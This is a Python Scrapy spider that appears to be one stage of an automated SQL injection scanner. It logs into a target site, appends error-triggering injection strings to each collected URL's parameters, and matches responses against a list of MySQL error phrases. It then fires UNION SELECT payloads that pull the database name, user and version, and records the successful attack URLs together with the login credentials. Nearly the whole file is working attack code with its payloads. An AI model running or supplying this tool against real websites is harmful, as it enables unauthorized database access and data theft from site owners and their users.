"""from scrapy.spider import Spider
from scrapy.selector import Selector
from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from dirbot.items import Website
from scrapy.selector import HtmlXPathSelector
from scrapy.contrib.exporter import JsonItemExporter
import scrapy
from scrapy.http.request import Request
from scrapy.http import FormRequest
from scrapy import log
from loginform import fill_login_form
from scrapy.xlib.pydispatch import dispatcher
from scrapy import signals
import copy
import json

error_payloads = ["+and+SLAP(10)+--+",
					"'kasdgh",
					"+AND+SEELCT"]
actual_payloads = ["%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+%20%3E%3E%2",
"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+",
"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+"]

#links = open('links.txt','r')

links = open('linksToAttack.txt','w')

with open('data.json') as data_file:
    data = json.load(data_file)

length = len(data)
for i in range(0,length-1):
    jsonval = json.dumps(data[i])
    data2 = json.loads(jsonval)
    links.write(data2['url']+"\n")
links.close()
links = open('linksToAttack.txt', 'r')
urls = links.readlines()
links.close()
#print urls
items = []
fin = {}
dic = {}
tempResponse = ""
searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column","access violation","SQLSTATE", 
 "different number of columns","Cardinality violation"]

class step3(Spider):
	name = "step3"
	with open('input.json') as data_file:
		data = json.load(data_file)
	start_urls = [data['starturl']]
	login_urls = [data['loginurl']]
	login_user = [data['username']]
	login_pass = [data['password']]
	params = []
	loginid = ""
	passid = ""
	login_reqd = "false"
	
	def parse(self, response):
		for temp in urls:
			if self.start_urls[0] in temp:
				yield Request(url=temp, meta={'temp':temp} , callback=self.save_original_resp)
				
		#print response
		args, url, method = fill_login_form(self.start_urls[0], response.body, self.login_user[0], self.login_pass[0])
		#print args
		self.login_reqd = "true"
		for a in args:
			if a[1] == self.login_user[0]:
				self.loginid = a[0]
			if a[1] == self.login_pass[0]:
				self.passid = a[0]
		print "IDs: " + self.loginid + ", " + self.passid
		yield FormRequest(url, method=method, formdata=args, callback=self.after_login)
		return

	def __init__(self):
		dispatcher.connect(self.spider_closed, signals.spider_closed)

	def after_login(self, response):
 		if (((("ERROR: Invalid username") or ("The username/password combination you have entered is invalid"))	in response.body) or (response.url is self.start_urls[0])):
			#self.log("Login failed", level=log.ERROR)
			yield
		# continue scraping with authenticated session...
		else:
			#self.log("Login succeed!", level=log.DEBUG)
			#print response.url
			'''f = open("app4login.html", "w")
			f.write(response.body)
			f.close()'''
			#print "response end!!\n"
			for temp in urls:
					if self.start_urls[0] in temp:
							yield Request(url=temp, meta={'temp':temp} , callback=self.save_original_resp)
			#file2 = open("vulnerableinks.txt","w")
			#for item in items:
					#file2.write(item+"\n")
			#write(temp+"\n")
			#file2.close()
			#temp = login_url + attack_url + "?" + query_string
			#yield Request(url=temp, callback=self.save_original_resp)
		return 
	'''
	def after_login(self, response):
		#print "i am here" 
		temp = login_url + attack_url
		##print temp + ": " + str(self.params)
		return FormRequest(temp, formdata=self.params, callback=self.save_original_resp)
	'''
	def save_original_resp(self, response):
		temp = response.request.meta['temp']
		newfile = open('linksWithFalsePayloads.txt','a')
		##print "Response: " + response.url
		file = open("original_response.html", "w")
		file.write(response.body)
		original = response.body
		file.close()
		for error in error_payloads:
				attack_with_payload = temp+error
				newfile.write(attack_with_payload+"\n")
				yield Request(attack_with_payload, meta={'temp':temp,'original':original}, callback=self.save_attack_resp)
				if "&" in temp:
						queryVals = temp.split('&')
						length = len(queryVals)
						for i in range(0,length-1):
								dupVals = copy.copy(queryVals);
								dupVals[i] = dupVals[i]+error
								finLink = "";
								for i in range(0,length-1):
										if i == 0:
												finLink += dupVals[i]
										else:
												finLink += "&"+dupVals[i]
								newfile.write(finLink+"\n")
								yield Request(finLink, meta={'temp':temp,'original':original}, callback=self.save_attack_resp)
		newfile.close()
		return 

	def save_attack_resp(self, response):
		file = open("attack_response.html", "w")
		file.write(response.body)
		file.close()
		temp = response.request.meta['temp']
		original = response.request.meta['original']
		#if searchterms in response.body:
		if any(term in response.body.lower() for term in searchterms):
			#self.log("\tVulnerable link: " + response.url, level=log.INFO)
			#This link is vulnerable lets do the actual attack
			if (temp not in items):
					items.append(temp)
					#UnionAndSelectAttacks
					attackLink1 = temp+actual_payloads[0]
					yield Request(attackLink1, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
					attackLink2 = temp+actual_payloads[1]
					yield Request(attackLink2, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
					attackLink3 = temp+actual_payloads[2]
					yield Request(attackLink3, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
					file2 = open("vulnerableinks.txt","w")
					file2.write(temp+"\n")
					file2.close()
		return

	def actual_attack_resp(self, response):
		file = open("actual_attack_response.html", "a")
		file.write(response.body)
		file.close()
		attackResponse = response.body
		original = response.request.meta['original']
		file4 = open("justToCheck.txt","a")
		file4.write(response.url)
		file4.close()
		#print "#############################################"
		if not attackResponse == original:
			if not any(term in response.body.lower() for term in searchterms):
				file4 = open("actualAttacks.txt","a")
				file4.write(response.url+"\n")
				file4.close()
				dic1 ={}
				dic1["method"] = "GET" #Pending
				dic1["LoginRequired"] = self.login_reqd
				dic1["username"] = self.login_user[0]
				dic1["password"] = self.login_pass[0]
				dic1["loginid"] = self.loginid
				dic1["passid"] = self.passid
				print dic1["LoginRequired"]
				#OtherParameterToWrite #Pending
				dic[response.url] = [dic1]
		temp = response.request.meta['temp']
		return

	def spider_closed(self, spider):
		fin = dict(dic)
		f = open("step3output.json", 'w')
		f.write(json.dumps(fin,indent= 4, sort_keys = True))
		f.close()
		
"""